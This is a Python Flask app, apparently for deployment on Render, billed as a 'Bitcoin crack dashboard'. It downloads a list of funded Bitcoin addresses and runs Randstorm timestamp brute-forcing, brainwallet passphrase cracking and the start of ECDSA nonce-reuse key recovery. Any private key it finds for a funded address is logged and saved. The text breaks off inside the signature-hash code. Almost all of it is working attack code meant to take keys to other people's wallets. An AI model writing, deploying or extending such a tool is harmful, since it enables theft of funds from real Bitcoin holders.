# btc_hunt.py — single-file Bitcoin crack dashboard for Render
"""
BTC Hunt — all viable pre-2015 Bitcoin attacks in one deployable app.

  1. Randstorm  (BitcoinJS-lib v0.1.3, 2011–2015) — timestamp brute force
  2. Brainwallet (SHA256 passphrase)            — wordlist → address
  3. Nonce Reuse (ECDSA, P2PKH/P2WPKH)         — Esplora API → algebra

Dashboard: Flask + short JSON progress polls. Persistent disk at /data.
Dataset: auto-download from public mirrors; source is configurable.

Deploy: gunicorn btc_hunt:app --bind 0.0.0.0:$PORT --timeout 180
"""

import os, sys, io, re, csv, gzip, json, math, time, signal, base64, hmac, html
import sqlite3, threading, hashlib, struct, argparse
from pathlib import Path
from datetime import datetime, timezone
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.request import urlopen, Request
from urllib.parse import urljoin

import requests
from flask import Flask, request, Response, redirect, url_for

# ════════════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════════════
DATA_DIR   = Path(os.environ.get("DISK_PATH", "/data" if os.path.isdir("/data") else "."))
DATA_DIR.mkdir(parents=True, exist_ok=True)

DB_PATH    = DATA_DIR / "btc_hunt.sqlite"
BLOOM_PATH = DATA_DIR / "funded.bloom"
ADDR_GZ    = DATA_DIR / "blockchair.tsv.gz"
RESULTS    = DATA_DIR / "results.json"

# Written while one or more in-memory jobs are running. btc-hunt-update checks
# this file and defers a redeploy instead of restarting the service (which
# would kill the job). Removed at import time in case a previous process died
# without cleaning up.
BUSY_FILE  = DATA_DIR / ".btc-hunt-busy"
try:
    BUSY_FILE.unlink(missing_ok=True)
except OSError:
    pass

# Public mirrors of the funded-Bitcoin-address dump. The old fixed URLs are
# dead as of 2026-11-09:
#   * addresses.loyce.club disabled direct /LATEST downloads (bandwidth abuse)
#     and asks users to use torrents; its HTML index still links dated dumps.
#   * 3xpl retired that path (dumps are now per-chain zstd files needing auth)
#   * privatekeys.pw paywalls downloads
# The .hex.gz variant is smaller, but Cloudflare fronts privatekeyfinder.io
# with a 403 from some EC2 IPs. LoyceV's dated snapshots are discovered at
# runtime and tried BEFORE these static mirrors; they are the source proven to
# work from AWS. The official source stays last because free downloads are
# throttled to ~10 kB/s without a key.
# Prepend custom mirrors with DATASET_URLS="https://...,https://..." (comma
# separated), or paste a single URL into the /data page.
_DEFAULT_DATASET_URLS = [
    "https://privatekeyfinder.io/assets/downloads/bitcoin.hex.gz",
    "https://privatekeyfinder.io/assets/downloads/bitcoin.tsv.gz",
    "https://privatekeyfinder.io/assets/downloads/blockchair_bitcoin_addresses_latest.tsv.gz",
    # Official source, but free downloads are throttled to ~10 kB/s without a key.
    "https://gz.blockchair.com/bitcoin/addresses/blockchair_bitcoin_addresses_latest.tsv.gz",
]
_OFFICIAL_DATASET_URL = _DEFAULT_DATASET_URLS[-1]
LOYCE_INDEX = "http://addresses.loyce.club/"
_custom_urls = [u.strip() for u in os.environ.get("DATASET_URLS", "").split(",")
                if u.strip()]
_CUSTOM_DATASET_URLS = list(_custom_urls)
DATASET_URLS = _custom_urls + _DEFAULT_DATASET_URLS


def _env_int(name, default, minimum):
    try:
        return max(minimum, int(os.environ.get(name, default)))
    except (TypeError, ValueError):
        return default


# A 1.47 GB / ~51M-row text dump can exceed 30 minutes on a small CPU after
# the download. Keep the network budget tight, but let the two
# streaming parse passes breathe. Both are configurable in /etc/btc-hunt.env.
DOWNLOAD_DEADLINE_SECS = _env_int("DOWNLOAD_DEADLINE_SECS", 1800, 300)
BUILD_DEADLINE_SECS = _env_int("BUILD_DEADLINE_SECS", 7200, 600)
if BUILD_DEADLINE_SECS < DOWNLOAD_DEADLINE_SECS:
    BUILD_DEADLINE_SECS = DOWNLOAD_DEADLINE_SECS
# Trusted public dumps do not need a Base58Check checksum hash per row. Set to
# 1/true/yes/on to verify every checksum (slower) for untrusted custom files.
DATASET_VERIFY_CHECKSUM = os.environ.get(
    "DATASET_VERIFY_CHECKSUM", "").strip().lower() in ("1", "true", "yes", "on")
ESPLORA    = os.environ.get("ESPLORA_URL", "https://blockstream.info/api")
PORT       = int(os.environ.get("PORT", 5000))
GENESIS_TS = 1293840000000  # 2011-01-01 ms
CUTOFF_TS  = 1420070400000  # 2015-01-01 ms

# secp256k1
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8


# ════════════════════════════════════════════════════════════════════
# CRYPTO PRIMITIVES
# ════════════════════════════════════════════════════════════════════
def _affine_add(p, q):
    if p is None: return q
    if q is None: return p
    x1,y1 = p; x2,y2 = q
    if x1==x2 and (y1+y2)%P==0: return None
    if p==q:
        lam=(3*x1*x1)*pow(2*y1,-1,P)%P
    else:
        lam=(y2-y1)*pow(x2-x1,-1,P)%P
    x3=(lam*lam-x1-x2)%P
    return (x3,(lam*(x1-x3)-y1)%P)

def ec_mul(k, pt=(Gx,Gy)):
    if k==0 or pt is None: return None
    k%=N; acc=None; g=pt
    while k:
        if k&1: acc=_affine_add(acc,g)
        g=_affine_add(g,g); k>>=1
    return acc

def privkey_to_compressed_pub(d):
    pt=ec_mul(d)
    if pt is None: return None
    x,y=pt
    return bytes([2+(y&1)])+x.to_bytes(32,'big')

def privkey_to_uncompressed_pub(d):
    pt=ec_mul(d)
    if pt is None: return None
    return b'\x04'+pt[0].to_bytes(32,'big')+pt[1].to_bytes(32,'big')

def sha256(b): return hashlib.sha256(b).digest()
def sha256d(b): return sha256(sha256(b))
def ripemd160(b):
    # OpenSSL 3 builds without the legacy provider raise ValueError here
    # (a known problem on some native-Python PaaS images).
    try:
        h=hashlib.new('ripemd160'); h.update(b); return h.digest()
    except (ValueError, TypeError):
        return _ripemd160_py(b)


def _ripemd160_py(msg):
    # Pure-Python RIPEMD160, used only if hashlib cannot provide it.
    h = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0]
    rl = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,
          7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8,
          3,10,14,4,9,15,8,1,2,7,0,6,13,11,5,12,
          1,9,11,10,0,8,12,4,13,3,7,15,14,5,6,2,
          4,0,5,9,7,12,2,10,14,1,3,8,11,6,15,13]
    rr = [5,14,7,0,9,2,11,4,13,6,15,8,1,10,3,12,
          6,11,3,7,0,13,5,10,14,15,8,12,4,9,1,2,
          15,5,1,3,7,14,6,9,11,8,12,2,10,0,4,13,
          8,6,4,1,3,11,15,0,5,12,2,13,9,7,10,14,
          12,15,10,4,1,5,8,7,6,2,13,14,0,3,9,11]
    sl = [11,14,15,12,5,8,7,9,11,13,14,15,6,7,9,8,
          7,6,8,13,11,9,7,15,7,12,15,9,11,7,13,12,
          11,13,6,7,14,9,13,15,14,8,13,6,5,12,7,5,
          11,12,14,15,14,15,9,8,9,14,5,6,8,6,5,12,
          9,15,5,11,6,8,13,12,5,12,13,14,11,8,5,6]
    sr = [8,9,9,11,13,15,15,5,7,7,8,11,14,14,12,6,
          9,13,15,7,12,8,9,11,7,7,12,7,6,15,13,11,
          9,7,15,11,8,6,6,14,12,13,5,14,13,13,7,5,
          15,5,8,11,14,14,6,14,6,9,12,9,12,5,15,8,
          8,5,12,9,12,5,14,6,8,13,6,5,15,13,11,11]
    kl = (0x00000000, 0x5A827999, 0x6ED9EBA1, 0x8F1BBCDC, 0xA953FD4E)
    kr = (0x50A28BE6, 0x5C4DD124, 0x6D703EF3, 0x7A6D76E9, 0x00000000)
    MASK = 0xFFFFFFFF

    def rol(x, n):
        return ((x << n) | (x >> (32 - n))) & MASK

    def f(j, x, y, z):
        if j < 16: return x ^ y ^ z
        if j < 32: return (x & y) | (~x & z)
        if j < 48: return (x | ~y) ^ z
        if j < 64: return (x & z) | (y & ~z)
        return x ^ (y | ~z)

    data = bytes(msg)
    bitlen = (len(data) * 8) & 0xFFFFFFFFFFFFFFFF
    data += b'\x80' + b'\x00' * ((55 - len(data)) % 64) + bitlen.to_bytes(8, 'little')
    for off in range(0, len(data), 64):
        X = [int.from_bytes(data[off+4*i:off+4*i+4], 'little') for i in range(16)]
        al, bl, cl, dl, el = h
        ar, br, cr, dr, er = h
        for j in range(80):
            t = (rol((al + f(j, bl, cl, dl) + X[rl[j]] + kl[j // 16]) & MASK, sl[j]) + el) & MASK
            al, bl, cl, dl, el = el, t, bl, rol(cl, 10), dl
            t = (rol((ar + f(79 - j, br, cr, dr) + X[rr[j]] + kr[j // 16]) & MASK, sr[j]) + er) & MASK
            ar, br, cr, dr, er = er, t, br, rol(cr, 10), dr
        t = (h[1] + cl + dr) & MASK
        h[1] = (h[2] + dl + er) & MASK
        h[2] = (h[3] + el + ar) & MASK
        h[3] = (h[4] + al + br) & MASK
        h[4] = (h[0] + bl + cr) & MASK
        h[0] = t
    return b''.join(x.to_bytes(4, 'little') for x in h)

def hash160(b): return ripemd160(sha256(b))

# Base58Check
B58='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
B58_MAP = {c: i for i, c in enumerate(B58)}
def b58encode(b):
    n=int.from_bytes(b,'big'); out=''
    while n: n,r=divmod(n,58); out=B58[r]+out
    for x in b:
        if x==0: out='1'+out
        else: break
    return out

def b58check(payload):
    return b58encode(payload+sha256d(payload)[:4])

def p2pkh_address(pubkey, compressed=True):
    h=hash160(pubkey)
    return b58check(b'\x00'+h)

# Bech32
BECH32='qpzry9x8gf2tvdw0s3jn54khce6mua7l'
BECH32_MAP = {c: i for i, c in enumerate(BECH32)}
def _bech32_polymod(v):
    G=[0x3b6a57b2,0x26508e6d,0x1ea119fa,0x3d4233dd,0x2a1462b3]; chk=1
    for x in v:
        b=chk>>25; chk=(chk&0x1ffffff)<<5^x
        for i in range(5):
            if (b>>i)&1: chk^=G[i]
    return chk
def _bech32_hrp_expand(hrp): return [ord(x)>>5 for x in hrp]+[0]+[ord(x)&31 for x in hrp]
def _bech32_create_checksum(hrp,data):
    values=_bech32_hrp_expand(hrp)+data
    polymod=_bech32_polymod(values+[0]*6)^1
    return [(polymod>>5*(5-i))&31 for i in range(6)]
def _convertbits(data,frombits,tobits,pad=True):
    acc=0; bits=0; ret=[]; maxv=(1<<tobits)-1
    for v in data:
        acc=(acc<<frombits)|v; bits+=frombits
        while bits>=tobits:
            bits-=tobits; ret.append((acc>>bits)&maxv)
    if pad and bits: ret.append((acc<<(tobits-bits))&maxv)
    return ret
def p2wpkh_address(pubkey_compressed, hrp='bc'):
    h=hash160(pubkey_compressed)
    data=[0]+_convertbits(h,8,5)
    checksum=_bech32_create_checksum(hrp,data)
    return hrp+'1'+''.join(BECH32[d] for d in data+checksum)

def derive_addresses(privkey):
    """Return list of (label, address) for all common Bitcoin address types."""
    out=[]
    try:
        cpub=privkey_to_compressed_pub(privkey)
        upub=privkey_to_uncompressed_pub(privkey)
    except Exception:
        return out
    if cpub:
        out.append(('p2pkh_c', p2pkh_address(cpub, True)))
        out.append(('p2wpkh', p2wpkh_address(cpub)))
    if upub:
        out.append(('p2pkh_u', p2pkh_address(upub, False)))
    return out


# ════════════════════════════════════════════════════════════════════
# BLOOM FILTER
# ════════════════════════════════════════════════════════════════════
class BloomFilter:
    """Bit-array bloom over hash160 values with double hashing."""
    def __init__(self, m_bits, k):
        self.m = m_bits
        self.k = k
        self.bits = bytearray((m_bits + 7) // 8)

    @classmethod
    def create(cls, n_items, fp_rate=0.001):
        m = int(-n_items * math.log(fp_rate) / (math.log(2) ** 2))
        m = (m + 7) // 8 * 8
        k = max(1, int((m / max(n_items, 1)) * math.log(2)))
        return cls(m, k)

    def _positions(self, h160):
        h = hashlib.sha256(h160).digest()
        h1 = int.from_bytes(h[:8], 'big')
        h2 = int.from_bytes(h[8:16], 'big')
        for i in range(self.k):
            yield (h1 + i * h2) % self.m

    def add(self, h160):
        # Inlined hot path: 51M rows × k positions, avoid a generator per row.
        h = hashlib.sha256(h160).digest()
        h1 = int.from_bytes(h[:8], 'big')
        h2 = int.from_bytes(h[8:16], 'big')
        m, k, bits = self.m, self.k, self.bits
        for i in range(k):
            pos = (h1 + i * h2) % m
            bits[pos >> 3] |= 1 << (pos & 7)

    def __contains__(self, h160):
        for pos in self._positions(h160):
            if not self.bits[pos >> 3] & (1 << (pos & 7)):
                return False
        return True

    def save(self, path):
        with open(path, 'wb') as f:
            f.write(struct.pack('<QQ', self.m, self.k))
            f.write(self.bits)

    @classmethod
    def load(cls, path):
        with open(path, 'rb') as f:
            m, k = struct.unpack('<QQ', f.read(16))
            bf = cls(m, k)
            bf.bits = bytearray(f.read())
        return bf


# ════════════════════════════════════════════════════════════════════
# DATASET
# ════════════════════════════════════════════════════════════════════
def _download(url, dest, log, progress=None, should_stop=None, deadline=None):
    # Stream into a .part file so a failed 1.5 GB transfer never leaves a
    # truncated dataset that later looks "already downloaded".
    log(f"[dl] {url}")
    if deadline is None:
        deadline = time.time() + 600
    tmp = Path(str(dest) + ".part")
    try:
        # Some mirrors reject the default python-requests User-Agent.
        r = requests.get(url, stream=True, timeout=(15, 60),
                         headers={"User-Agent":
                                  "Mozilla/5.0 (compatible; btc-hunt/1.0)",
                                  # Never let requests transparently decompress the
                                  # .gz file into a corrupt "dataset".
                                  "Accept-Encoding": "identity"})
        r.raise_for_status()
        total = int(r.headers.get('content-length', 0))
        done = 0; last = 0
        with open(tmp, 'wb') as f:
            for chunk in r.iter_content(1 << 20):
                if should_stop and should_stop():
                    raise RuntimeError("cancelled")
                if time.time() > deadline:
                    raise RuntimeError("download exceeded its time budget")
                f.write(chunk); done += len(chunk)
                if total and done - last > 50 << 20:
                    last = done
                    log(f"[dl] {done/1e9:.2f}/{total/1e9:.2f} GB")
                    if progress:
                        progress(0.05 + 0.20 * min(done / total, 1.0),
                                 f"downloading {done/1e9:.2f}/{total/1e9:.2f} GB")
        if not done:
            raise RuntimeError("mirror returned an empty response")
        with open(tmp, 'rb') as fh:
            if fh.read(2) != b'\x1f\x8b':
                raise RuntimeError("mirror returned non-gzip content (HTML error page?)")
        tmp.replace(dest)
        log(f"[✓] downloaded {done/1e9:.2f} GB")
        if progress:
            progress(0.25, "download complete")
        return True
    except Exception as e:
        log(f"[!] {url}: {e}")
        tmp.unlink(missing_ok=True)
        if str(e) in ("cancelled", "download exceeded its time budget"):
            raise  # stop / expired budget: do not silently try the next mirror
        return False


def _loyce_dated_urls(log, should_stop=None):
    """LoyceV disabled its LATEST direct downloads in 2026 but still links
    dated snapshots from its index. Discover the newest few so the fallback
    list does not go stale every time the date changes. Torrent is not used:
    it would require a BitTorrent client and inbound peer ports on EC2.
    """
    if should_stop and should_stop():
        raise RuntimeError("cancelled")
    try:
        r = requests.get(LOYCE_INDEX, timeout=(10, 20), headers={
            "User-Agent": "Mozilla/5.0 (compatible; btc-hunt/1.0)"})
        r.raise_for_status()
        scored = []
        for href in re.findall(r'href="([^"]+\.gz)"', r.text, re.I):
            m = re.search(
                r'(Bitcoin_addresses|blockchair_bitcoin_addresses_and_balance)'
                r'_([A-Za-z]+)_(\d{1,2})_(\d{4})\.(txt|tsv)\.gz$', href)
            if not m:
                continue
            try:
                ts = datetime.strptime(
                    f"{m.group(2)} {m.group(3)} {m.group(4)}", "%B %d %Y").timestamp()
            except ValueError:
                continue
            scored.append((ts, urljoin(LOYCE_INDEX, href)))
        # Newest first; on the same day prefer the smaller text-only dump.
        scored.sort(key=lambda t: (t[0], ".txt.gz" in t[1]), reverse=True)
        urls, seen = [], set()
        for _, u in scored:
            if u in seen:
                continue
            seen.add(u); urls.append(u)
            if len(urls) >= 6:
                break
        if urls:
            log(f"[dl] LoyceV index: {len(urls)} dated snapshot(s) found")
        return urls
    except RuntimeError:
        raise
    except Exception as e:
        log(f"[dl] LoyceV index unavailable: {e}")
        return []


def _decode_hash(token):
    """Accept a base58/bech32 address OR a 40-char hash160 hex string."""
    h = _address_to_hash160(token)
    if h:
        return h
    t = token[2:] if token.lower().startswith("0x") else token
    if len(t) == 40:
        try:
            b = bytes.fromhex(t)
            if len(b) == 20:
                return b
        except ValueError:
            pass
    return None


HEX_LETTERS = frozenset("abcdefABCDEF")


def _hex_to_hash(token):
    """40-char hash160 hex, optionally 0x-prefixed. Avoid decoding a 40-digit
    decimal balance as hex: unprefixed all-digit tokens are rejected."""
    prefixed = token[:2].lower() == "0x"
    t = token[2:] if prefixed else token
    if len(t) != 40 or (not prefixed and t.isdecimal()):
        return None
    try:
        b = bytes.fromhex(t)
    except ValueError:
        return None
    return b if len(b) == 20 else None


def _address_to_hash160_fast(addr):
    """Dataset-optimised decoder. Skips per-row checksum hashing for trusted
    public dumps, but still checks length/version/charset. Set
    DATASET_VERIFY_CHECKSUM=1 for full Base58Check and bech32 validation.
    """
    if not addr:
        return None
    if addr[:3].lower() == "bc1":
        if len(addr) > 90:
            return None
        if DATASET_VERIFY_CHECKSUM:
            return _address_to_hash160(addr)
        data = _bech32_decode_fast(addr)
        if data:
            prog = _convertbits(data[1:], 5, 8, pad=False)
            if len(prog) == 20:
                return bytes(prog)
        return None
    if len(addr) > 40:
        return None
    if addr[0] in "13":
        try:
            n = 0
            for c in addr:
                n = n * 58 + B58_MAP[c]
            raw = n.to_bytes((n.bit_length() + 7) // 8, 'big')
            pad = len(addr) - len(addr.lstrip('1'))
            raw = b'\x00' * pad + raw
        except (KeyError, ValueError, OverflowError):
            return None
        if len(raw) != 25 or raw[0] not in (0, 5):
            return None
        if DATASET_VERIFY_CHECKSUM and sha256d(raw[:21])[:4] != raw[21:]:
            return None
        return raw[1:21]
    return None


def _sniff_dataset_format(path, sample_lines=2000):
    """Decide once which decoder the 51M-row hot loop should use."""
    hex_hits = addr_hits = 0
    with gzip.open(path, 'rt', errors='ignore') as f:
        for i, line in enumerate(f):
            if i >= sample_lines:
                break
            for token in line.rstrip('\r\n').split('\t'):
                t = token.strip()
                if not t:
                    continue
                if _hex_to_hash(t):
                    hex_hits += 1
                elif _address_to_hash160_fast(t):
                    addr_hits += 1
    if hex_hits and addr_hits:
        return "mixed"
    if hex_hits:
        return "hex"
    if addr_hits:
        return "address"
    return "generic"


def build_bloom(log, progress=None, should_stop=None, urls=None):
    # Two streaming passes over the gzip: pass 1 sizes the bloom from the row
    # count, pass 2 fills it directly. Holding every hash160 in a Python set
    # needs several GB and gets OOM-killed on a small instance.
    deadline = time.time() + BUILD_DEADLINE_SECS
    download_deadline = min(deadline, time.time() + DOWNLOAD_DEADLINE_SECS)

    def report(frac, detail):
        if progress:
            progress(frac, detail)

    def check():
        if should_stop and should_stop():
            raise RuntimeError("cancelled")
        if time.time() > deadline:
            raise RuntimeError("dataset build exceeded its time budget")

    if urls is None:
        sources = list(DATASET_URLS)
        # Only scrape the index when a download is actually needed; a cached
        # .gz must build completely offline.
        if not ADDR_GZ.exists():
            check()
            dated = _loyce_dated_urls(log, should_stop)
            if dated:
                # LoyceV dated snapshots are the source proven to work from
                # EC2. Try them immediately after any user-supplied URLs and
                # before privatekeyfinder.io / throttled Blockchair.
                i = min(len(_CUSTOM_DATASET_URLS), len(sources))
                sources[i:i] = dated
    else:
        sources = list(urls)
    if not ADDR_GZ.exists():
        report(0.02, "downloading dataset")
        log(f"[dl] {len(sources)} mirror(s) configured")
        log(f"[dl] download budget {DOWNLOAD_DEADLINE_SECS}s; "
            f"build budget {BUILD_DEADLINE_SECS}s")
        ok = False
        for u in sources:
            check()
            if _download(u, ADDR_GZ, log, progress, should_stop, download_deadline):
                ok = True; break
        if not ok:
            raise RuntimeError(
                f"all {len(sources)} dataset mirrors failed — paste a working "
                f".gz URL above, set DATASET_URLS, or place the file at {ADDR_GZ}")
    else:
        report(0.25, "dataset already downloaded")

    try:
        fmt = _sniff_dataset_format(ADDR_GZ)
    except Exception as e:
        log(f"[parse] format sniff failed: {e}; using generic parser")
        fmt = "generic"
    log(f"[parse] format: {fmt}")

    def hashes():
        # One decoder per format instead of trying address + hex + checksum on
        # every one of ~51M rows. Handles TSVs, plain address lists, hex dumps.
        with gzip.open(ADDR_GZ, 'rt', errors='ignore') as f:
            if fmt == "hex":
                for line in f:
                    for token in line.rstrip('\r\n').split('\t'):
                        h = _hex_to_hash(token.strip())
                        if h:
                            yield h
                            break
            elif fmt == "address":
                for line in f:
                    for token in line.rstrip('\r\n').split('\t'):
                        h = _address_to_hash160_fast(token.strip())
                        if h:
                            yield h
                            break
            elif fmt == "mixed":
                for line in f:
                    for token in line.rstrip('\r\n').split('\t'):
                        t = token.strip()
                        h = _hex_to_hash(t) or _address_to_hash160_fast(t)
                        if h:
                            yield h
                            break
            else:
                for line in f:
                    for token in line.rstrip('\r\n').split('\t'):
                        h = _decode_hash(token.strip())
                        if h:
                            yield h
                            break

    log("[parse] pass 1/2 — counting address rows")
    report(0.30, "pass 1/2 — counting address rows")
    n = 0
    for _ in hashes():
        n += 1
        if n % 100000 == 0:
            check()  # time.time()/stop check per row was a large overhead
        if n % 1000000 == 0:
            log(f"[parse] pass 1 — {n/1e6:.1f}M rows counted")
            report(0.30 + 0.05 * min(n / 100_000_000, 1.0),
                   f"pass 1/2 — {n/1e6:.1f}M rows counted")
    check()
    log(f"[parse] {n:,} rows — sizing bloom")
    if not n:
        raise RuntimeError("dataset contains no usable addresses")
    bf = BloomFilter.create(n, fp_rate=0.001)

    log(f"[parse] pass 2/2 — filling bloom ({bf.m/8/1e6:.0f} MB bitset, k={bf.k})")
    report(0.35, "pass 2/2 — filling bloom")
    i = 0
    for h in hashes():
        bf.add(h); i += 1
        if i % 100000 == 0:
            check()
        if i % 500000 == 0:
            log(f"[parse] {i/1e6:.1f}M/{n/1e6:.1f}M addresses")
            report(0.35 + 0.60 * min(i / n, 1.0),
                   f"pass 2/2 — {i/1e6:.1f}M/{n/1e6:.1f}M addresses")
    check()
    bf.save(BLOOM_PATH)
    log(f"[✓] bloom saved ({BLOOM_PATH.stat().st_size/1e6:.0f} MB, "
        f"{bf.m/8/1e6:.0f} MB bitset, k={bf.k})")
    report(1.0, f"done — {n/1e6:.1f}M addresses indexed")
    return bf

def _address_to_hash160(addr):
    """Extract 20-byte hash160 from P2PKH/P2SH/Bech32 address string."""
    try:
        if addr.startswith('1') or addr.startswith('3'):
            raw = _b58decode(addr)
            if len(raw) == 25 and sha256d(raw[:21])[:4] == raw[21:]:
                return raw[1:21]
        elif addr.lower().startswith('bc1'):
            data = _bech32_decode(addr)
            if data:
                prog = _convertbits(data[1:], 5, 8, pad=False)
                if len(prog) == 20: return bytes(prog)
    except Exception:
        pass
    return None

def _b58decode(s):
    n = 0
    for c in s:
        n = n * 58 + B58_MAP[c]
    raw = n.to_bytes((n.bit_length()+7)//8, 'big')
    pad = len(s) - len(s.lstrip('1'))
    return b'\x00'*pad + raw

def _bech32_decode(addr):
    addr = addr.lower()
    pos = addr.rfind('1')
    if pos < 1: return None
    data = [BECH32_MAP.get(c, -1) for c in addr[pos+1:]]
    if -1 in data: return None
    hrp = addr[:pos]
    if _bech32_polymod(_bech32_hrp_expand(hrp) + data) != 1:
        return None
    return data[:-6]


def _bech32_decode_fast(addr):
    """Trusted-dump decoder: validate charset/hrp/length, skip polymod checksum."""
    addr = addr.lower()
    pos = addr.rfind('1')
    if pos < 1 or addr[:pos] != 'bc':
        return None
    data = [BECH32_MAP.get(c, -1) for c in addr[pos+1:]]
    if -1 in data or len(data) < 7:
        return None
    return data[:-6]


# ════════════════════════════════════════════════════════════════════
# ATTACK 1 — RANDSTORM
# ════════════════════════════════════════════════════════════════════
class MWC1616:
    """V8-era Math.random replica (MWC1616)."""
    def __init__(self, seed):
        self.s0 = seed & 0xFFFFFFFF
        self.s1 = (seed ^ 0x5DEECE66D) & 0xFFFFFFFF
    def next(self):
        self.s0 = (18030 * (self.s0 & 0xFFFF) + (self.s0 >> 16)) & 0xFFFFFFFF
        self.s1 = (36969 * (self.s1 & 0xFFFF) + (self.s1 >> 16)) & 0xFFFFFFFF
        return ((self.s1 << 16) + self.s0) & 0xFFFFFFFF

def _rc4_init(key):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    return S

def _rc4_bytes(S, n):
    i = j = 0; out = bytearray()
    for _ in range(n):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(S[(S[i] + S[j]) & 0xFF])
    return bytes(out)

def _bitcoinjs_securerandom(seed_ms):
    """Replicate BitcoinJS-lib v0.1.3 SecureRandom.nextBytes(32)."""
    rng = MWC1616(seed_ms)
    pool = bytearray(256)
    pptr = 0
    while pptr < 256:
        t = int(65536 * (rng.next() / 4294967296.0))
        pool[pptr] = (t >> 8) & 0xFF; pptr += 1
        if pptr < 256:
            pool[pptr] = t & 0xFF; pptr += 1
    pptr = 0
    def seed_int(x):
        nonlocal pptr
        for shift in (0, 8, 16, 24):
            pool[pptr] ^= (x >> shift) & 0xFF
            pptr = (pptr + 1) % 256
    seed_int(seed_ms); seed_int(seed_ms)
    # getByte initialises ArcFour with pool and seeds again
    seed_int(seed_ms); seed_int(seed_ms)
    S = _rc4_init(pool)
    return _rc4_bytes(S, 32)

def attack_randstorm(start_ms, end_ms, bf, log, job):
    """Iterate timestamp range, derive keys, check bloom."""
    total = end_ms - start_ms + 1
    log(f"[randstorm] {start_ms}..{end_ms}  ({total:,} timestamps)")
    hits = []; t0 = time.time()
    for i, ts in enumerate(range(start_ms, end_ms + 1)):
        if job["stop"]: log("[randstorm] stopped"); break
        try:
            pk = int.from_bytes(_bitcoinjs_securerandom(ts), 'big') % N
            if pk == 0: continue
            for label, addr in derive_addresses(pk):
                h = _address_to_hash160(addr)
                if h and h in bf:
                    hit = {"ts": ts, "privkey": hex(pk), "address": addr,
                           "type": label, "found_at": datetime.now(timezone.utc).isoformat()}
                    hits.append(hit)
                    log(f"  ★★★ HIT {addr}  privkey={hex(pk)}  ts={ts}")
                    _save_result("randstorm", hit)
        except Exception:
            pass
        if i % 500 == 0:
            rate = (i + 1) / max(time.time() - t0, 0.001)
            job["progress"] = (i + 1) / total
            job["detail"] = f"{i+1:,}/{total:,}  {rate:.0f} ts/s  hits={len(hits)}"
    log(f"[randstorm] done — {len(hits)} hits")
    return hits


# ════════════════════════════════════════════════════════════════════
# ATTACK 2 — BRAINWALLET
# ════════════════════════════════════════════════════════════════════
def attack_brainwallet(passphrases, bf, log, job):
    hits = []; total = len(passphrases); t0 = time.time()
    log(f"[brain] {total:,} passphrases")
    for i, pw in enumerate(passphrases):
        if job["stop"]: break
        try:
            pk = int.from_bytes(sha256(pw.encode('utf-8')), 'big') % N
            if pk == 0: continue
            for label, addr in derive_addresses(pk):
                h = _address_to_hash160(addr)
                if h and h in bf:
                    hit = {"passphrase": pw, "privkey": hex(pk),
                           "address": addr, "type": label,
                           "found_at": datetime.now(timezone.utc).isoformat()}
                    hits.append(hit); _save_result("brainwallet", hit)
                    log(f"  ★★★ HIT {addr}  pw={pw!r}")
        except Exception:
            pass
        if i % 200 == 0:
            rate = (i + 1) / max(time.time() - t0, 0.001)
            job["progress"] = (i + 1) / total
            job["detail"] = f"{i+1:,}/{total:,}  {rate:.0f} pw/s  hits={len(hits)}"
    log(f"[brain] done — {len(hits)} hits")
    return hits


# ════════════════════════════════════════════════════════════════════
# ATTACK 3 — NONCE REUSE
# ════════════════════════════════════════════════════════════════════
def _esplora_get(path):
    r = requests.get(f"{ESPLORA}{path}", timeout=25)
    r.raise_for_status()
    return r.text

def _parse_der_sig(sig):
    """Return (r, s, sighash_type) or None."""
    if len(sig) < 9 or sig[0] != 0x30: return None
    try:
        i = 2
        if sig[i] != 0x02: return None
        rlen = sig[i+1]; r = int.from_bytes(sig[i+2:i+2+rlen], 'big')
        i += 2 + rlen
        if sig[i] != 0x02: return None
        slen = sig[i+1]; s = int.from_bytes(sig[i+2:i+2+slen], 'big')
        i += 2 + slen
        htype = sig[i] if i < len(sig) else 1
        return r, s, htype
    except Exception:
        return None

def _legacy_sighash(raw_tx, input_idx, prevout_script, htype=1):
    """Bitcoin legacy SIGHASH_ALL computation."""
    try:
        # parse tx
        def varint(b, p):
            n = b[p]; p += 1
            if n < 0xfd: return n, p
            if n == 0xfd: return int.from_bytes(b[p:p+2],'little'), p+2
            if n == 0xfe: return int.from_bytes(b[p:p+4],'little'), p+4
            return int.from_bytes(b[p:p+8],'little'), p+8
        p = 0; version = raw_tx[p:p+4]; p += 4
        n_in, p = varint(raw_tx, p)
        ins = []
        for _ in range(n_in):
            start = p
            p += 36  # prev txid + vout
            slen, p = varint(raw_tx, p)
            script = raw_tx[p:p+slen]; p += slen
            seq = raw_tx[p:p+4]; p += 4
            ins.append((raw_tx[start:start+36], script, seq))
        n_out, p = varint(raw_tx, p)
        outs = []
        for _ in range(n_out):
            val = raw_tx[p:p+8]; p += 8
            slen, p = varint(raw_tx, p)
            script = raw_tx[p:p+slen]; p += slen
            outs.append((val, script))
        locktime = raw_tx[p:p+4]
        # replace scriptSig of input_idx with prevout_script, others empty
        out = bytearray(version)
        def put_varint(n):
            if n < 0xfd: return bytes([n])
            if n <= 0xffff: return b'\xfd' + n.to_bytes(2,'little')
            if n <= 0xffffffff: return b'\xfe' + n.to_bytes(4,'little')
            return b'\xff' + n.to_bytes(8,'little')
        out += put_varint(n_in)
        for i, (prev, script, seq) in enumerate(ins):
            out += prev
            use = prevout_script if i == input_idx else b''
